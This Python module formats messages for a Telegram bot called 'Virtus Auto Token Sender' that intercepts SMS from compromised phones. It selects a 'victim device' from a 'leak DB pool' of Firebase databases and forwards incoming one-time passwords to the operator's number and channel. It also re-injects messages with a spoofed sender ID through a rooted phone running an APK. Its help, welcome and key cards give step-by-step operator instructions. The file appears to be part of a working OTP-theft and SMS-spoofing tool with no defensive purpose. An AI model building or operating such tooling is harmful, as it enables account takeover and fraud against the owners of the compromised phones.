import json
from datetime import datetime, timezone

from telegram import InlineKeyboardButton, InlineKeyboardMarkup

from app.database import Device, MonitorProfile

STARTUP_TEST_SENDER = "BABY"
STARTUP_TEST_MESSAGE = "ASTIK TEST OK — module alive"
BRAND_NAME = "Virtus Auto Token Sender"
ASTIK_BRAND_LINE = f"──✦ <b>{BRAND_NAME}</b> ✦──"


def format_apk_download_card(download_url: str) -> str:
    link = download_url.strip()
    return (
        "📥 <b>Astik Bot Module APK</b>\n\n"
        "👇 <b>iOS / iPhone:</b> neeche <b>Download APK</b> button dabao\n"
        "Phir Android phone par transfer karke install karo\n\n"
        f'🔗 <a href="{link}">Tap here — Download APK</a>\n\n'
        "<pre>"
        "Android (rooted mynum phone):\n"
        "1. APK install (ASTIK SMS MODULE)\n"
        "2. Bot: /key generate ya /key KEY-XXXX\n"
        "3. Bot: /a device → /mynum apk-phone → /injecttest\n"
        "4. APK me sirf wahi KEY daalo\n"
        "5. START SERVICE ON → OTP inject hoga"
        "</pre>"
    )


def format_addchannel_card(channel_id: str, sim_slot: int = 1) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        f"📢 Channel: {channel_id}\n"
        f"📶 SIM: {sim_slot}"
        "</pre>"
    )


def format_firebase_connected_card(
    firebase_url: str,
    online_count: int,
    total: int = 0,
    device_ids: list[str] | None = None,
) -> str:
    ids_block = ""
    if device_ids:
        preview = device_ids[:8]
        ids_block = "\n\n" + "\n".join(f"• {device_id}" for device_id in preview)
        if len(device_ids) > 8:
            ids_block += f"\n... +{len(device_ids) - 8} more"
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Firebase Connected! &lt;/&gt;\n\n"
        f"URL: {firebase_url}\n"
        f"📱 Online Devices Found: {online_count}\n"
        "Next Step: /setdevice"
        f"{ids_block}"
        "</pre>"
    )


def format_premium_gate_card(user_id: int) -> str:
    return (
        "🔒 <b>PREMIUM ACCESS REQUIRED</b>\n\n"
        "<pre>"
        "&gt; You must be approved to use this bot.\n\n"
        f"👤 Your ID: {user_id}"
        "</pre>"
    )


def format_access_approved_card() -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Your premium access has been APPROVED by the Admin!"
        "</pre>"
    )


def short_device_id(name: str) -> str:
    return name[:8] if len(name) > 8 else name


def get_device_meta(device: Device) -> dict:
    if not hasattr(device, "device_meta") or not device.device_meta:
        return {}
    try:
        return json.loads(device.device_meta)
    except (json.JSONDecodeError, TypeError):
        return {}


def _is_valid_sim_number(number: str | None) -> bool:
    if not number:
        return False
    normalized = str(number).strip().upper()
    return normalized not in {"N/A", "UNKNOWN", "NA", "-", "NONE", ""}


def _normalize_sim_slots(sims: list[dict]) -> list[dict]:
    valid = [sim for sim in sims if isinstance(sim, dict) and _is_valid_sim_number(sim.get("number"))]
    source = valid if valid else [sim for sim in sims if isinstance(sim, dict)]
    if not source:
        return []
    normalized: list[dict] = []
    for index, sim in enumerate(source):
        normalized.append(
            {
                "slot": index + 1,
                "index": index,
                "carrier": sim.get("carrier") or f"SIM {index + 1}",
                "number": sim.get("number") or "Unknown",
            }
        )
    return normalized


def get_sim_list(device: Device) -> list[dict]:
    meta = get_device_meta(device)
    sims = meta.get("sims")
    if isinstance(sims, list) and sims:
        cleaned = [sim for sim in sims if isinstance(sim, dict)]
        if cleaned:
            return _ensure_dual_sim_list(_normalize_sim_slots(cleaned))

    primary = device.phone_number
    sim2 = meta.get("sim2") or meta.get("phone2")
    built: list[dict] = []
    if _is_valid_sim_number(primary):
        built.append({"slot": 1, "index": 0, "carrier": "SIM 1", "number": primary})
    if _is_valid_sim_number(sim2):
        built.append(
            {
                "slot": len(built) + 1,
                "index": len(built),
                "carrier": "SIM 2",
                "number": sim2,
            }
        )
    if built:
        return _ensure_dual_sim_list(built)
    return _ensure_dual_sim_list(
        [{"slot": 1, "index": 0, "carrier": "SIM 1", "number": primary or "Unknown"}]
    )


def _ensure_dual_sim_list(sims: list[dict]) -> list[dict]:
    """Always show SIM 1 + SIM 2 in cards and buttons (Astik layout)."""
    if not sims:
        return [
            {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "N/A"},
            {"slot": 2, "index": 1, "carrier": "SIM 2", "number": "N/A"},
        ]
    ordered = sorted(sims, key=lambda sim: sim.get("slot", sim.get("index", 0) + 1))
    first = {**ordered[0], "slot": 1, "index": 0}
    if len(ordered) >= 2:
        second = {**ordered[1], "slot": 2, "index": 1}
        return [first, second]
    return [
        first,
        {"slot": 2, "index": 1, "carrier": "SIM 2", "number": "N/A"},
    ]


def get_display_sims(device: Device) -> list[dict]:
    """UI — always SIM 1 and SIM 2."""
    return get_sim_list(device)[:2]


def get_active_sims(device: Device) -> list[dict]:
    sims = get_sim_list(device)
    active = [sim for sim in sims if _is_valid_sim_number(sim.get("number"))]
    if active:
        return active
    return sims[:1] if sims else [{"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}]


def get_selected_sim(device: Device, sim_index: int = 0) -> dict:
    sims = get_sim_list(device)
    if 0 <= sim_index < len(sims):
        return sims[sim_index]
    active = get_active_sims(device)
    return active[0] if active else {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}


def get_inject_key(profile: MonitorProfile | None, device: Device) -> str:
    from app.license_keys import is_valid_license_key_format, license_key_exists

    license_key = (profile.license_key or "").strip().upper() if profile else ""
    if is_valid_license_key_format(license_key) and license_key_exists(license_key):
        return license_key
    device_key = (device.api_key or "").strip().upper()
    if is_valid_license_key_format(device_key) and license_key_exists(device_key):
        return device_key
    return "—"


def format_device_online(device: Device | None) -> str:
    """Live Firebase device state for bot cards."""
    if not device:
        return "⚪ —"
    from app.services import device_status

    status = device_status(device)
    if status == "online":
        return "🟢 ON"
    if status == "idle":
        return "🟡 IDLE"
    return "🔴 OFF"


def format_device_connection_status(device: Device | None) -> str:
    """Astik-style Online / Offline line for device cards."""
    if not device:
        return "🔴 Offline"
    from app.services import device_status

    status = device_status(device)
    if status == "online":
        return "🟢 Online"
    return "🔴 Offline"


def _device_phone_display(device: Device) -> str:
    from app.services import display_phone

    if device.phone_number:
        return display_phone(device.phone_number)
    meta = get_device_meta(device)
    sims = meta.get("sims")
    if isinstance(sims, list):
        for sim in sims:
            if isinstance(sim, dict) and _is_valid_sim_number(sim.get("number")):
                return str(sim.get("number"))
    return "Unknown"


def _db_label(device: Device, profile: MonitorProfile | None = None) -> str:
    url = device.firebase_source_url or (profile.firebase_url if profile else None) or ""
    if not url:
        return "—"
    return url.rstrip("/")


def get_battery(device: Device) -> str:
    meta = get_device_meta(device)
    battery = meta.get("battery") or meta.get("battery_level")
    if battery is None:
        return "N/A"
    text = str(battery).strip()
    if not text or text.lower() in {"unknown", "n/a", "na", "null", "none"}:
        return "N/A"
    return f"{text}%" if "%" not in text else text


def get_model_name(device: Device) -> str:
    meta = get_device_meta(device)
    return meta.get("model") or meta.get("device_model") or "Unknown"


def _format_sim_number(number: str) -> str:
    text = str(number or "Unknown").strip()
    if text.startswith("+") or len(text) > 12:
        return text
    return f"+{text}" if text.isdigit() else text


def _sim_has_rich_label(sim: dict) -> bool:
    """Show number/carrier on SIM buttons when we know the slot number."""
    return _is_valid_sim_number(sim.get("number"))


def _sim_list_line(sim: dict, *, found_card: bool = False) -> str:
    """Astik SIM row — found card uses +91, setdevice uses local digits or N/A."""
    from app.services import display_phone

    slot = sim.get("slot", 1)
    carrier = (sim.get("carrier") or f"SIM {slot}").strip()
    number = sim.get("number")
    if not _is_valid_sim_number(number):
        return f"SIM {slot}: Unknown (N/A)"
    shown = _format_sim_number(number) if found_card else display_phone(number)
    return f"SIM {slot}: {carrier} ({shown})"


def _active_sim_line(sim: dict) -> str:
    slot = sim.get("slot", 1)
    index = sim.get("index", slot - 1)
    carrier = (sim.get("carrier") or f"SIM {slot}").strip()
    if _sim_has_rich_label(sim):
        return f"📶 Active SIM: {carrier} (Index {index})"
    return f"📶 Active SIM: SIM {slot} (Index {index})"


def _from_number_line(sim: dict) -> str:
    from app.services import display_phone

    number = sim.get("number")
    if _is_valid_sim_number(number):
        return f"📞 FROM Number: {display_phone(number)}"
    return "📞 FROM Number: N/A"


def _sim_button_label(sim: dict, *, compact: bool = False) -> str:
    from app.services import display_phone

    slot = sim.get("slot", 1)
    if compact:
        return f"📶 SIM {slot}"
    carrier = sim.get("carrier") or f"SIM {slot}"
    number = display_phone(sim.get("number")) if _is_valid_sim_number(sim.get("number")) else "N/A"
    label = f"📶 SIM {slot}: {carrier} ({number})"
    return label[:32] + "..." if len(label) > 35 else label


def _sim_lines_block(device: Device, *, found_card: bool = False) -> str:
    sims = get_display_sims(device)
    if not sims:
        return "SIM 1: Unknown (N/A)"
    return "\n".join(_sim_list_line(sim, found_card=found_card) for sim in sims)


def format_device_found_card(
    device: Device,
    profile: MonitorProfile | None = None,
    *,
    found_ms: int | None = None,
    monitoring_was_stopped: bool = False,
) -> str:
    """Astik /fdy — Device Found & Set card with DB + timing."""
    stop_block = ""
    if monitoring_was_stopped:
        stop_block = (
            "\n⚠️ Previous monitoring was AUTO-STOPPED.\n"
            "Use /startmonitor again when ready."
        )
    sim_block = _sim_lines_block(device, found_card=True)
    timing = f"\n⚡ Found in {found_ms}ms" if found_ms is not None else ""
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "✅ Device Found &amp; Set! &lt;/&gt;\n"
        f"📱 {short_device_id(device.name)}\n"
        f"📞 {_device_phone_display(device)}\n"
        f"🔋 {get_battery(device)}\n"
        f"{format_device_connection_status(device)}\n"
        f"🗄️ DB: {_db_label(device, profile)}"
        f"{stop_block}\n\n"
        f"{sim_block}\n\n"
        "Select SIM to send FROM:"
        f"{timing}"
        "</pre>"
    )


def format_device_set_card(
    device: Device,
    selected_sim: int = 0,
    profile: MonitorProfile | None = None,
    *,
    status: str = "online",
) -> str:
    """Astik /setdevice — Device Set card with live status, DB, SIM list."""
    device_short = short_device_id(device.name)
    active = get_selected_sim(device, selected_sim)
    sim_block = _sim_lines_block(device, found_card=False)

    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Device Set!\n\n"
        f"📱 {device_short}\n"
        f"🔋 {get_battery(device)}\n"
        f"{format_device_connection_status(device)}\n"
        f"🗄️ DB: {_db_label(device, profile)}\n"
        f"{_active_sim_line(active)}\n"
        f"{_from_number_line(active)}\n\n"
        f"{sim_block}\n\n"
        "Select SIM Slot for sending SMS:"
        "</pre>"
    )


def device_set_keyboard(device: Device, *, compact: bool | None = None) -> InlineKeyboardMarkup:
    sims = get_display_sims(device)
    if compact is None:
        compact = not any(_sim_has_rich_label(sim) for sim in sims)
    buttons = [
        InlineKeyboardButton(
            _sim_button_label(sim, compact=compact),
            callback_data=f"sim:{device.id}:{sim['index']}",
        )
        for sim in sims
    ]
    if len(buttons) == 2:
        return InlineKeyboardMarkup([buttons])
    return InlineKeyboardMarkup([[button] for button in buttons])


def sim_monitoring_keyboard(device: Device) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "🟢 START Monitoring",
                    callback_data=f"monitor:start:{device.id}",
                ),
                InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop"),
            ]
        ]
    )


def format_sim_selected_card(
    device: Device,
    sim_index: int = 0,
    profile: MonitorProfile | None = None,
) -> str:
    active = get_selected_sim(device, sim_index)
    slot = active.get("slot", 1)
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        f"📱 {short_device_id(device.name)}\n"
        f"📡 Device: {format_device_connection_status(device)}\n"
        f"✅ SIM {slot} selected\n"
        f"🔋 {get_battery(device)}\n"
        f"🗄️ DB: {_db_label(device, profile)}\n\n"
        "Tap START Monitoring or STOP:"
        "</pre>"
    )


def format_timing_footer(queued_ms: int, total_ms: int) -> str:
    return f"⏱ queued {queued_ms}ms | total {total_ms}ms"


def format_inject_startup_card(
    sender: str,
    message: str,
    queued_ms: int = 3,
    total_ms: int = 15,
    *,
    to_number: str | None = None,
    poll_id: str | None = None,
    firebase_url: str | None = None,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    poll_line = ""
    if poll_id:
        poll_line = f"📍 APK poll: messages/{poll_id}\n"
    apk_hint = (
        "📲 Phone pe SMS nahi? APK: START SERVICE ON + same KEY + root\n"
        "15 min baad auto-stop — dubara /startmonitor ya /injecttest"
    )
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        "⚡ INJECT FORWARDED! [STARTUP]\n"
        f"📤 Sender: {sender}\n"
        f"🔐 {body}\n"
        f"{poll_line}"
        f"{format_timing_footer(queued_ms, total_ms)}\n"
        f"{apk_hint}"
        "</pre>"
    )


def format_outbound_stream_card(
    to_number: str,
    message: str,
    *,
    sim_slot: int = 1,
    source: str = "CHANNEL",
    queued_ms: int = 3,
    total_ms: int = 22,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    if len(body) > 500:
        body = body[:500] + "..."
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        f"🎯 TOKEN FORWARDED! [{source.upper()}]\n"
        f"📞 To: {to_number}\n"
        f"🔐 {body}\n"
        "📋 Format: Emoji\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_firebase_otp_card(
    sender: str,
    message: str,
    queued_ms: int = 3,
    total_ms: int = 14,
) -> str:
    """Astik-style OTP card from Firebase (bot-only display)."""
    return format_inject_stream_card(
        sender,
        message,
        queued_ms=queued_ms,
        total_ms=total_ms,
    )


def format_inject_stream_card(
    sender: str,
    message: str,
    queued_ms: int = 3,
    total_ms: int = 22,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    if len(body) > 500:
        body = body[:500] + "..."
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        "⚡ INJECT FORWARDED! [STREAM] &lt;/&gt;\n"
        f"📤 Sender: {sender}\n"
        f"🔐 {body}\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_mynum_set_card(phone: str, poll_id: str | None = None) -> str:
    from app.services import display_phone

    shown = display_phone(phone)
    poll_line = f"📍 Inject path: messages/{poll_id}\n" if poll_id else ""
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        "Forwarding Number Set!\n"
        f"📞 Real SMS -&gt; {shown}\n"
        f"{poll_line}"
        "Ab yahi number inject hoga — purana replace ho gaya.\n"
        "Monitoring ON ho to turant apply; warna /startmonitor ya /injecttest."
        "</pre>"
    )


def format_auto_stop_card(minutes: int = 15) -> str:
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        f"Monitoring STOPPED! ({minutes} min auto-stop)\n"
        "⏸️ Inject + OTP poll + APK uptime band ho gaye.\n\n"
        "Dobara start (normal flow):\n"
        "→ /startmonitor\n"
        "(ya /resume — same kaam)\n\n"
        "APK phone: START SERVICE ON + same KEY rakho.\n"
        "Phir /injecttest se SMS check kar sakte ho.\n\n"
        "Timer badhana: /autostop 60"
        "</pre>"
    )


def format_stop_card() -> str:
    return format_auto_stop_card()


def format_monitoring_card(
    device: Device,
    profile: MonitorProfile,
    ignored_sms: int = 0,
    test_message: str | None = None,
    *,
    startup_test_sent: bool = False,
) -> str:
    from app.services import display_phone, resolve_mynum_phone

    sim_index = profile.selected_sim_index or 0
    active_sim = get_selected_sim(device, sim_index)
    sim_slot = active_sim.get("slot", 1)
    sim_number = active_sim.get("number")
    if _is_valid_sim_number(sim_number):
        sim_suffix = display_phone(str(sim_number))
    else:
        sim_suffix = "Unknown"
    auto_stop = profile.auto_stop_minutes if profile.auto_stop_minutes is not None else 15
    auto_stop_line = (
        "⏱️ Auto-stop: OFF (manual /stop tak)"
        if auto_stop <= 0
        else f"⏱️ Auto-stop in {auto_stop} minutes"
    )
    inject_key = get_inject_key(profile, device)
    test_msg = test_message or STARTUP_TEST_MESSAGE
    test_line = f"✅ Test inject OK: {test_msg}" if startup_test_sent else "⏳ Test inject queued..."
    channel = profile.channel_id or "—"
    mynum = resolve_mynum_phone(profile) or profile.phone_number
    real_sms = display_phone(mynum) if mynum else "—"
    device_tail = _device_phone_display(device)
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        "Monitoring Started!\n"
        f"📱 Device: {short_device_id(device.name)} | {device_tail}\n"
        f"📶 FROM SIM: {sim_slot} ({sim_suffix})\n"
        f"🔑 Inject Key: {inject_key}\n"
        "📩 Incoming -&gt; spoof inject (same sender ID)\n"
        f"📞 Real SMS -&gt; {real_sms}\n"
        f"📢 Channel: {channel} (last /addchannel only)\n"
        f"{auto_stop_line}\n"
        f"🗃️ Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
        f"{test_line}"
        "</pre>"
    )


def monitoring_keyboard(
    device: Device | None = None,
    *,
    monitoring_active: bool = False,
) -> InlineKeyboardMarkup:
    start_data = f"monitor:start:{device.id}" if device else "monitor:on"
    start_label = "🟢 Monitoring ON..." if monitoring_active else "🟢 START Monitoring"
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(start_label, callback_data=start_data),
                InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop"),
            ]
        ]
    )


def format_commands_message() -> str:
    """Astik-style /help — all commands."""
    return (
        f"{ASTIK_BRAND_LINE}\n\n"
        "✨ 📖 <b>Injector Setup (Sender Spoof)</b>\n"
        "<pre>"
        "1. /key KEY-XXXX-XXXX-XXXX — Your license key\n"
        "2. /fy &lt;device_id&gt; — Pick device to monitor\n"
        "3. Pick SIM → /addchannel → /startmonitor\n"
        "4. → Incoming SMS replayed with SAME sender ID via inject"
        "</pre>\n\n"
        "✨ 📖 <b>Admin Setup (Firebase Panel)</b>\n"
        "<pre>"
        "1. /fb &lt;device_id&gt; — Find device &amp; select SIM\n"
        "2. /mynum &lt;number&gt; — Your forwarding number\n"
        "3. /addchannel — Add group for monitoring\n"
        "4. /startmonitor — Start auto-forwarding"
        "</pre>\n\n"
        "✨ 📖 <b>User Setup</b>\n"
        "<pre>"
        "1. /setfirebase &lt;url&gt; — Connect your DB\n"
        "2. /setdevice — Pick device &amp; select SIM\n"
        "3. /mynum &lt;number&gt; — Your forwarding number\n"
        "4. /addchannel — Add group\n"
        "5. /startmonitor — Start monitoring"
        "</pre>\n\n"
        "✨ 🎮 <b>Controls</b>\n"
        "<pre>"
        "/stop — Pause monitor\n"
        "/resume — Resume monitor\n"
        "/status — View current stats\n"
        "/send &lt;num&gt; &lt;msg&gt; — Manual SMS\n"
        "/ping — Check latency"
        "</pre>"
    )


def format_welcome_message() -> str:
    """Astik-style /start welcome card."""
    return (
        f"{ASTIK_BRAND_LINE}\n\n"
        "✨ <b>Welcome to Premium Automation</b>\n"
        "<blockquote>Fast, secure, and reliable OTP forwarding directly to your Firebase connected devices.</blockquote>\n\n"
        "✨ 📖 <b>Injector Setup (Sender Spoof)</b>\n"
        "<pre>"
        "1. /key KEY-XXXX-XXXX-XXXX — Your license key (like /mynum for inject)\n"
        "2. /fy &lt;device_id&gt; — Pick device to monitor\n"
        "3. Pick SIM → /addchannel → /startmonitor\n"
        "4. → Incoming SMS replayed with SAME sender ID via inject API"
        "</pre>\n\n"
        "✨ 📖 <b>Admin Setup (Firebase Panel)</b>\n"
        "<pre>"
        "1. /fb &lt;device_id&gt; — Find device &amp; select SIM\n"
        "2. /mynum &lt;number&gt; — Your forwarding number\n"
        "3. /addchannel — Add group for monitoring\n"
        "4. /startmonitor — Start auto-forwarding"
        "</pre>\n\n"
        "✨ 📖 <b>User Setup</b>\n"
        "<pre>"
        "1. /setfirebase &lt;url&gt; — Connect your DB\n"
        "2. /setdevice — Pick device &amp; select SIM\n"
        "3. /mynum &lt;number&gt; — Your forwarding number\n"
        "4. /addchannel — Add group\n"
        "5. /startmonitor — Start monitoring"
        "</pre>\n\n"
        "✨ 🎮 <b>Controls</b>\n"
        "<pre>"
        "/stop /resume /status /send /ping"
        "</pre>"
    )


def format_guide_message() -> str:
    """Astik-style /guide — same sections as /help with channel notes."""
    return (
        format_commands_message()
        + "\n\n"
        "✨ 📡 <b>Channel SMS (Auto Token)</b>\n"
        "<pre>"
        "917290053434 | OTP message\n"
        "To: 917290053434 / Message: text\n"
        "→ Selected SIM se auto send (webhookEvent)"
        "</pre>"
    )


def format_status_card(
    device: Device | None,
    profile: MonitorProfile | None,
) -> str:
    if not profile:
        return "❌ <code>/setfirebase &lt;url&gt;</code>"

    device_name = device.name if device else "Not set"
    inject_key = get_inject_key(profile, device) if device else (profile.license_key or "—")
    automation = "🟢 Running" if profile.is_monitoring else "🔴 Stopped"

    device_online = format_device_online(device) if device else "⚪ —"
    return (
        f"📊 <b>{BRAND_NAME}</b>\n\n"
        "<pre>"
        f"📱 Device: {device_name}\n"
        f"📡 Firebase: {device_online}\n"
        f"🔑 KEY: {inject_key}\n"
        f"📞 /mynum: {profile.phone_number or '—'}\n"
        f"📢 Channel: {profile.channel_id or '—'}\n"
        f"⚡ Monitor: {automation}"
        "</pre>"
    )


def format_ping_card(latency_ms: int) -> str:
    return (
        "✅ <b>PONG</b>\n\n"
        "<pre>"
        f"🏓 {latency_ms}ms"
        "</pre>"
    )


def format_device_not_found_card(device_id: str, db_count: int) -> str:
    """Astik-style — device missing from entire leak DB pool."""
    return (
        "❌ <b>ERROR</b>\n\n"
        "<pre>"
        f"Device {device_id} not found in any of the {db_count} databases!"
        "</pre>"
    )


def format_key_error_card() -> str:
    return (
        "❌ <b>ERROR</b>\n\n"
        "<pre>"
        "Usage: '/key KEY-XXXX-XXXX-XXXX'\n"
        "Example: '/key KEY-BF0U-2LBM-5W6W'\n\n"
        "This is your inject target (like /mynum for spoof SMS)."
        "</pre>"
    )


def format_key_generated_card(license_key: str) -> str:
    return (
        "✅ <b>KEY GENERATED</b>\n\n"
        f"<pre>🔑 {license_key}</pre>\n\n"
        "<pre>"
        "Next:\n"
        "1. /a &lt;device_id&gt; — victim device\n"
        "2. /mynum &lt;apk-phone&gt; — rooted inject phone\n"
        "3. /injecttest — test SMS\n"
        "APK: same KEY → START SERVICE ON"
        "</pre>"
    )


def format_key_set_card(inject_key: str) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "License Key Set!\n\n"
        f"🔑 {inject_key}\n\n"
        "Next: '/a &lt;device_id&gt;' → SIM → '/mynum &lt;apk-phone&gt;' → '/startmonitor'\n"
        "APK: same KEY only → START ON → TEST INJECTION\n"
        "Incoming SMS inject with SAME sender ID on /mynum phone."
        "</pre>"
    )


def format_send_queued(to_number: str, message: str, sim_slot: int) -> str:
    return (
        "✅ <b>SMS Queued</b>\n\n"
        "<pre>"
        f"📶 SIM: {sim_slot}\n"
        f"📞 To: {to_number}\n"
        f"💬 {message[:200]}"
        "</pre>"
    )


def update_device_meta(device: Device, data: dict) -> dict:
    meta = get_device_meta(device)
    meta.update(data)
    return meta
